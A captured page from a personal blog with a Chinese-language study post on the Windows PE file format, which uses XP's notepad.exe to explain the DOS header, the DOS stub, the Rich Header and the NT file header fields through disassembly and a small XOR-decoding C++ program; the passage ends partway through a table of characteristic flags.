<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","width":500,"display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/9/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/9/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/14/PE%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/14/PE%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">程序员的自我修养 chapter 5 PE/COFF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-07-14 23:44:00" itemprop="dateCreated datePublished" datetime="2022-07-14T23:44:00+08:00">2022-07-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-25 19:37:48" itemprop="dateModified" datetime="2023-09-25T19:37:48+08:00">2023-09-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Portable-Executable"><a href="#Portable-Executable" class="headerlink" title="Portable Executable"></a>Portable Executable</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="notepad-exe-on-winXP"><a href="#notepad-exe-on-winXP" class="headerlink" title="notepad.exe on winXP"></a>notepad.exe on winXP</h3><p>首先,win11上的notepad.exe和winXP上的notepad.exe不一样</p>
<p>左是winxp上的notepad.exe,右是win11上的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710191351701.png" alt="image-20220710191351701"></p>
<p>方便获取核心原理的讲解,还是使用winxp的notepad.exe</p>
<p>直接从虚拟机拽到win11上用010editor分析就可以</p>
<h3 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h3><p>windows上的目标文件叫做PE</p>
<blockquote>
<p>可执行的有.exe,.src(即可执行目标模块,类似于linux上的.out)</p>
<p>库文件有.dll等(动态库,类似于linux上的.so)</p>
<p>驱动程序有.sys等</p>
<p>对象文件有.obj(即可重定位目标模块,类似于linux上的.o文件)</p>
</blockquote>
<p>PE文件可以分成两部分,头和身子</p>
<p>头就是PE头,身子就是各节区内容</p>
<p>PE在磁盘中存放时的状态和运行时加载进入虚拟内存的状态不完全相同</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710112514843.png" alt="image-20220710112514843"></p>
<h3 id="虚拟地址-相对虚拟地址-映像基址-文件偏移"><a href="#虚拟地址-相对虚拟地址-映像基址-文件偏移" class="headerlink" title="虚拟地址,相对虚拟地址,映像基址,文件偏移"></a>虚拟地址,相对虚拟地址,映像基址,文件偏移</h3><p>一些符号约定,后面会推导这些量的转化关系</p>
<p>VA(Virtual Address):虚拟地址空间中的地址</p>
<p><code>RVA(Relative Virtual Address)</code>:相对虚拟地址,相对于虚拟地址空间中基地址的偏移量</p>
<p>ImageBase:进程映像在虚拟地址空间中的基地址</p>
<p>关系:$VA&#x3D;RVA+ImageBase$</p>
<p>文件中保存的都是RVA,实际运行时需要选定一个ImageBase,其他RVA地址基于该ImageBase计算得到运行时的虚拟地址.</p>
<p>RAW:文件偏移,符号在磁盘文件中躺着时,相对于文件开始的偏移量</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">RAW</span><span class="punctuation">(</span><span class="variable">x</span><span class="punctuation">)</span><span class="operator">=</span><span class="variable">RVA</span><span class="punctuation">(</span><span class="variable">x</span><span class="punctuation">)</span><span class="operator">-</span><span class="variable">section</span><span class="punctuation">[</span><span class="variable">i</span><span class="punctuation">]</span><span class="operator">.</span><span class="variable">VirtualAddress</span><span class="operator">+</span><span class="variable">section</span><span class="punctuation">[</span><span class="variable">i</span><span class="punctuation">]</span><span class="operator">.</span><span class="variable">PointerToRawData</span></span><br></pre></td></tr></table></figure>



<h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/PE%E5%A4%B4.png"></p>
<h3 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710193646618.png" alt="image-20220710193646618"></p>
<p>DOS头的最后一个成员是AddressOfNewExeHeader,其值是NT头相对于本文件开始的偏移量</p>
<p>可以看到NotePad.exe中其值为E8h,而本文件的E8h处正好就是NtHeader的起始地址</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710205215866.png" alt="image-20220710205215866"></p>
<p>为啥要设置这么一个值呢?</p>
<p>因为DOS头和NtHeader之间有一个DOS桩,如果这个DOS桩也是定长的,则显然不需要记录Nt头的偏移量</p>
<p>然而DOS桩长度可变,因此为了定位Nt头需要专门记录一下</p>
<p>为啥不在DOS桩里面记录Nt头的位置?DOS桩只有在DOS环境下才会执行,桌面环境下轮不到DOS桩执行</p>
<h3 id="DOS桩"><a href="#DOS桩" class="headerlink" title="DOS桩"></a>DOS桩</h3><blockquote>
<p>桩,存根, 占位代码，粘合代码，残存代码, 指满足形式要求但没有实现实际功能的占坑&#x2F;代理代码。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710193746654.png" alt="image-20220710193746654"></p>
<p>32位PE程序中,由于DOS头是定长的,因此从40h开始是DOS桩,而DOS桩不一定是定长的</p>
<p>winXP上的notepad.exe,其dos桩长度为90h</p>
<p>DOS桩是干啥的呢?在DOS环境下执行PE程序会执行DOS桩内的指令,而不是执行正儿八经的PE程序</p>
<p>为啥呢?DOS环境是16位的,并且没有GUI,当然跑不起来正儿八经的记事本了.</p>
<p>既然DOS桩也可以执行,那么它干了啥事呢?</p>
<p>将DOS桩提出来用ida 16位反编译</p>
<p>发现前D个字节确实可以反汇编成指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000 0E                       push    cs</span><br><span class="line">seg000:0001 1F                       pop     ds</span><br><span class="line">seg000:0002 BA 0E 00                 mov     dx, 0Eh</span><br><span class="line">seg000:0005 B4 09                    mov     ah, 9</span><br><span class="line">seg000:0007 CD 21                    int     21h             ; DOS - PRINT STRING</span><br><span class="line">seg000:0007                                                  ; DS:DX -&gt; string terminated by &quot;$&quot;</span><br><span class="line">seg000:0009 B8 01 4C                 mov     ax, 4C01h</span><br><span class="line">seg000:000C CD 21                    int     21h             ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT)</span><br><span class="line">seg000:000C                                                  ; AL = exit code</span><br></pre></td></tr></table></figure>

<p>此后紧跟着就是有实际意义的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:000E aThisProgramCan db &#x27;This program cannot be run in DOS mode.&#x27;,0Dh,0Dh,0Ah</span><br><span class="line">seg000:000E                 db &#x27;$&#x27;,0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意到字符串下面有一个美元符号’$’,它也是有作用的,后面就知道了</p>
</blockquote>
<p>那么这前D个字节的指令干了啥事呢</p>
<p>首先将cs拷贝给ds,然后将<code>This program cannot be run in DOS mode.$</code>这个字符串的起始地址0Eh放到dx中,目的是为后来的函数调用做准备</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000 0E                       push    cs</span><br><span class="line">seg000:0001 1F                       pop     ds</span><br><span class="line">seg000:0002 BA 0E 00                 mov     dx, 0Eh</span><br></pre></td></tr></table></figure>

<blockquote>
<p>为啥要把cs拷贝给ds呢?因为这时候cs段寄存器存放的就是当前正在执行的代码段的起始地址,</p>
<p>后面的字符串虽然是数据,但是也是存放在当前代码段的,</p>
<p>访问数据要使用ds:dx两个寄存器,</p>
<p>要想指向这个字符串,ds需要等于字符串的段地址,也就是cs</p>
</blockquote>
<p>然后<code>ah=9h</code>决定<code>int 21h</code>做什么工作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:<span class="number">0005</span> B4 <span class="number">09</span>                    mov     ah, <span class="number">9</span></span><br><span class="line">seg000:<span class="number">0007</span> CD <span class="number">21</span>                    <span class="type">int</span>     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br></pre></td></tr></table></figure>

<p>当<code>AH=9</code>的时候,<code>int 21h</code>显示字符串,将<code>DS:DX</code>开始的字符串一直<strong>打印到<code>$</code>结束</strong></p>
<p>然后<code>4c01h</code>放在<code>ax</code>中,再次决定<code>int 21h</code>做什么工作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seg000:0009 B8 01 4C                 mov     ax, 4C01h</span><br><span class="line">seg000:000C CD 21                    int     21h             ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT)</span><br></pre></td></tr></table></figure>

<p>当<code>ah=4c</code>时,<code>int 21h</code>决定带返回码返回,返回码就放在<code>al</code>中,显然这里是<code>01h</code></p>
<p>现在DOS桩的逻辑弄明白了,但是但是,代码和数据只是占了一小部分,桩后半部分那些乱码是啥呢?</p>
<p>010editor给出了一些线索</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710200602144.png" alt="image-20220710200602144"></p>
<p>DOS桩剩下这一部分叫做Rich Header,</p>
<p>单凭其最后一个成员XorKey,一个异或钥匙,就知道这rich_header玩意儿应该是加密的,</p>
<p>既然给了异或钥匙,直接解密试试</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="title class_">ElemType</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">4</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> value;</span><br><span class="line">    <span class="built_in">ElemType</span>()&#123;</span><br><span class="line">        value=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ElemType</span>(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> &amp;i)&#123;</span><br><span class="line">        value=i;</span><br><span class="line">    &#125;</span><br><span class="line">    ElemType <span class="keyword">operator</span>=(<span class="type">const</span> ElemType &amp;e)&#123;</span><br><span class="line">        value=e.value;</span><br><span class="line">        <span class="keyword">return</span> (*<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> ElemType &amp;e)&#123;</span><br><span class="line">        cout&lt;&lt;hex&lt;&lt;e.value&lt;&lt;<span class="string">&quot;   &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)&#123;</span><br><span class="line">            os&lt;&lt;e.str[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="keyword">operator</span>^=(<span class="type">const</span> ElemType &amp;e)&#123;</span><br><span class="line">        value^=e.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">ElemType data[<span class="number">17</span>] = &#123;</span><br><span class="line">    <span class="number">0x9B166DA5</span>, <span class="number">0xC8780CE1</span>, <span class="number">0xC8780CE1</span>, <span class="number">0xC8780CE1</span>, <span class="number">0xC8382F1B</span>, <span class="number">0xC8780CE0</span>, <span class="number">0xC8780CE1</span>, <span class="number">0xC8780CE0</span>, </span><br><span class="line">    <span class="number">0xC8612F1B</span>, <span class="number">0xC8780CF2</span>, <span class="number">0xC8790CE1</span>, <span class="number">0xC8780C23</span>, <span class="number">0xC83D2F76</span>, <span class="number">0xC8780CE0</span>, <span class="number">0xC8642F3B</span>, <span class="number">0xC8780CF2</span>, </span><br><span class="line">    <span class="number">0xC8452F1B</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key=<span class="number">0xC8780CE1</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">17</span>;++i)&#123;</span><br><span class="line">        data[i]^=key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">17</span>;++i)&#123;</span><br><span class="line">        cout&lt;&lt;data[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\PE&gt; g++ main.cpp <span class="literal">-O0</span> <span class="literal">-o</span> main</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\Desktop\PE&gt; ./main</span><br><span class="line"><span class="number">536</span>e6144   DanS</span><br><span class="line"><span class="number">0</span>   </span><br><span class="line"><span class="number">0</span>   </span><br><span class="line"><span class="number">0</span>   </span><br><span class="line"><span class="number">4023</span>fa   ?</span><br></pre></td></tr></table></figure>

<p>结果给了一个”DanS”字符串还有一堆乱码</p>
<p>我猜DanS是一个开发者姓名的前缀.但是上网搜不到…</p>
<p>尤其是搜NotePad作者的时候总是铺天盖地的降智辱华话题,凡是能在这种话题上引起讨论的都是大聪明</p>
<h3 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span><span class="comment">//64位程序的NT头</span></span><br><span class="line">  DWORD Signature;</span><br><span class="line">  IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64,*PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span><span class="comment">//32位程序的NT头</span></span><br><span class="line">  DWORD Signature;</span><br><span class="line">  IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>

<p>对于notepad.exe</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711122440212.png" alt="image-20220711122440212"></p>
<p>其NT头从E8h开始,长度为F8h</p>
<p>包括三个成员,一个双字类型的签名魔数4550h,表明NT头开始了</p>
<p>两个结构体成员,一个文件头,一个可选头</p>
<h4 id="Nt文件头"><a href="#Nt文件头" class="headerlink" title="Nt文件头"></a>Nt文件头</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  WORD Machine;</span><br><span class="line">  WORD NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD SizeOfOptionalHeader;</span><br><span class="line">  WORD Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<p>notepad.exe的文件头</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711122847055.png" alt="image-20220711122847055"></p>
<h5 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a>Machine</h5><p>Machine是机器码,表征该程序可以在哪种计算机体系上运行</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711123000530.png" alt="image-20220711123000530"></p>
<p>显然winXP上的notepad.exe的Machine值是14Ch,对应x86体系</p>
<h5 id="NumberOfSections"><a href="#NumberOfSections" class="headerlink" title="NumberOfSections"></a>NumberOfSections</h5><p>节区数量,该值和节区头表中存在的节区数量一定相等</p>
<p>NotePad.exe中该值为3,其后面的节区数量也确实为3</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711123225586.png" alt="image-20220711123225586"></p>
<p>该值决定了节区头表的大小(每个节都在节区头表中有相同大小的一项)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711123352685.png" alt="image-20220711123352685"></p>
<p>可以看出节区头表中的项目都是28h字节大小的</p>
<h5 id="TimeDateStamp"><a href="#TimeDateStamp" class="headerlink" title="TimeDateStamp"></a>TimeDateStamp</h5><p>链接器生成该文件的时间,该值是从1970年1月1日0时(UTC时间)开始的秒数</p>
<p>notepad.exe中该值为</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711123559456.png" alt="image-20220711123559456"></p>
<p>010editor已经帮我们换算好了时间,是<code>2001.8.17 20:52:29</code></p>
<h5 id="PointerToSymbolTable"><a href="#PointerToSymbolTable" class="headerlink" title="PointerToSymbolTable"></a>PointerToSymbolTable</h5><p>符号表symbol table的偏移量,如果没有符号表则该值为0</p>
<p>notepad.exe中没有符号表,该值为0</p>
<blockquote>
<p>为啥可以没有符号表呢?</p>
<p>符号是给人看的,比如每个函数,每个变量都有一个名字.这是为了方便人记忆与理解</p>
<p>但是机器不需要,要执行哪个函数只会在汇编语言中写上call 地址,只认地址不认名</p>
<p>可能编译链接阶段需要符号解析,用到符号表,但是一旦编译链接完成,生成了可执行目标文件,符号表就纯纯的没用了</p>
</blockquote>
<h5 id="NumberOfSymbols"><a href="#NumberOfSymbols" class="headerlink" title="NumberOfSymbols"></a>NumberOfSymbols</h5><p>记录符号表中的符号数量</p>
<p>notepad.exe没有符号表,该项也为0</p>
<h5 id="SizeOfOptionalHeader"><a href="#SizeOfOptionalHeader" class="headerlink" title="SizeOfOptionalHeader"></a>SizeOfOptionalHeader</h5><p>可选头的大小</p>
<p>在notepad.exe中该值为224D&#x3D;E0h</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711131155606.png" alt="image-20220711131155606"></p>
<p>紧跟在文件头后面的可选头恰好就这么大</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711131247686.png" alt="image-20220711131247686"></p>
<blockquote>
<p>DOS头记录了NT头的偏移量,类比一下,为啥没有记录可选头的起始位置呢?</p>
<p>因为文件头的大小是固定的14h,Characterstics是一些二进制位按位或,其总长度就是一个WORD不变</p>
<p>因此可选头紧接着文件头,只要文件头的偏移量知道了,立刻可以算出</p>
<p>可选头的偏移量&#x3D;文件头+14h字节</p>
<p>而文件头的偏移量是多少?文件头是Nt头的第二个成员,第一个成员是一个双字类型的NT签名,</p>
<p>因此文件头的偏移量&#x3D;Nt头的偏移量+4字节</p>
<p>Nt头的偏移量是多少?DOS头的<code>DWORD AddressOfNewExeHeader</code>会直接给出</p>
<p>AddressOfNewExeHeader在哪里?DOS头是PE文件的开始,AddressOfNewExeHeader是其3C偏移处,即AddressOfNewHeader永远是PE文件的3Ch到40h字节</p>
</blockquote>
<h5 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h5><p>本文件属性,多个属性时按位或</p>
<p>比如0x0002就表示可执行映像,意味本文件可以执行(没有未解析的外部引用),</p>
<p>显然括号里是说给可重定位目标模块听的,因为.obj只是完成了编译,尚未经过链接,外部符号仍未解析</p>
<p>又如0x2000就表示DLL动态库文件,虽然它是可执行文件,但是它不能直接运行.</p>
<p>又如0x4000表示本文件只能在单处理机计算机上运行</p>
<table>
<thead>
<tr>
<th align="left">Value</th>
<th align="left">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>IMAGE_FILE_RELOCS_STRIPPED</strong>0x0001</td>
<td align="left">Relocation information was stripped from the file. The file must be loaded at its preferred base address. If the base address is not available, the loader reports an error.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_EXECUTABLE_IMAGE</strong>0x0002</td>
<td align="left">The file is executable (there are no unresolved external references).</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_LINE_NUMS_STRIPPED</strong>0x0004</td>
<td align="left">COFF line numbers were stripped from the file.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_LOCAL_SYMS_STRIPPED</strong>0x0008</td>
<td align="left">COFF symbol table entries were stripped from file.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_AGGRESIVE_WS_TRIM</strong>0x0010</td>
<td align="left">Aggressively trim the working set. This value is obsolete.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_FILE_LARGE_ADDRESS_AWARE</strong>0x0020</td>
